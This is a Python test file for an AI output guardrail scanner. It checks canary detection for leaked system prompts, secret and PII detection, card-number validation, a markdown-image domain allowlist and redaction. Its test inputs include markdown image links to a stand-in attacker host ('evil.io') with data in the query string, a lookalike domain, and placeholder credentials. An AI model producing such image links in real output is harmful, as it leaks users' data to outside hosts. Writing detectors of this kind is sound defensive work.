from llm_guardrail.output_scanner import (embed_canary, luhn_valid, make_canary, sanitize_output,
                                          scan_output)


def ids(findings):
    return {f.finding_id for f in findings}


def test_canary_roundtrip():
    canary = make_canary()
    assert canary in embed_canary("You are a helpful bot.", canary)
    assert "OUT-CANARY" in ids(scan_output(f"My instructions mention {canary}", canaries=[canary]))
    assert make_canary() != canary


def test_partial_canary_detected_without_known_value():
    assert "OUT-CANARY-PARTIAL" in ids(scan_output("ref GRDCNRY-abcdef12"))


def test_secrets_detected():
    text = ("AKIAIOSFODNN7EXAMPLE ghp_" + "a" * 36 + " sk-ant-" + "b" * 30 +
            "\n-----BEGIN RSA PRIVATE KEY-----\npassword = hunter2hunter2")
    assert {"SEC-AWS", "SEC-GH", "SEC-ANTH", "SEC-PRIVKEY", "SEC-PASSWD"} <= ids(scan_output(text))


def test_luhn():
    assert luhn_valid("4111 1111 1111 1111")
    assert not luhn_valid("4111 1111 1111 1112")
    assert not luhn_valid("1234")


def test_non_luhn_digit_runs_are_not_cards():
    assert "PII-CARD" not in ids(scan_output("Order 1234567890123456 shipped"))


def test_pii_can_be_disabled():
    assert ids(scan_output("mail me at a@b.io, SSN 123-45-6789", scan_pii=False)) == set()
    assert {"PII-EMAIL", "PII-SSN"} <= ids(scan_output("mail me at a@b.io, SSN 123-45-6789"))


def test_markdown_image_allowlist():
    text = "![logo](https://cdn.example.com/l.png) ![t](https://evil.io/p.gif?d=abc)"
    findings = scan_output(text, allowed_domains={"example.com"})
    urls = [f.match for f in findings if f.finding_id == "OUT-MDIMG"]
    assert urls == ["https://evil.io/p.gif?d=abc"]
    assert findings[0].weight == 70


def test_lookalike_domain_is_not_allowlisted():
    findings = scan_output("![x](https://example.com.evil.io/p.png)", allowed_domains={"example.com"})
    assert "OUT-MDIMG" in ids(findings)


def test_sanitize_redacts_all_spans():
    text = "key AKIAIOSFODNN7EXAMPLE and ![x](https://evil.io/a?q=1) done"
    clean = sanitize_output(text, scan_output(text))
    assert "AKIA" not in clean and "evil.io" not in clean
    assert clean.startswith("key [REDACTED:SEC-AWS] and [external image removed by guardrail] done")
